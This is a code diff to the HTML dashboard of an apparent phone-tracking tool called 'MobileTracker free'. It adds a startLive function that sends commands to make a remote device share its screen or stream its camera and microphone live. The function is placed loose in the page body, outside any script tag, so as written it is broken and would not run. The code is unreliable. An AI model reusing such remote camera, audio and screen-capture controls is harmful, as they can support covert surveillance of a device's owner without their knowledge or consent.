@@ -65,7 +65,17 @@
     </style>
 </head>
 <body>
-
+function startLive() {
+    let cmd = "";
+    if (currentMode === 'screen') {
+        // This command should trigger the service to launch ScreenCaptureActivity
+        cmd = "request-screen-permission"; 
+    } else {
+        cmd = `stream:${document.getElementById('cam-id').value}:${document.getElementById('aud-id').value === 'yes' ? 'audio-video' : 'video'}`;
+    }
+    sendCmd(cmd);
+    document.getElementById('video-overlay').style.display = 'block';
+}
     <div class="sidebar">
         <div class="sidebar-header">MobileTracker <span style="font-weight:300">free</span></div>
         <div class="nav-item active" onclick="showTab('dashboard')"><i class="fa fa-home"></i> Dashboard</div>
@@ -185,3 +195,4 @@
     </script>
 </body>
 </html>
+
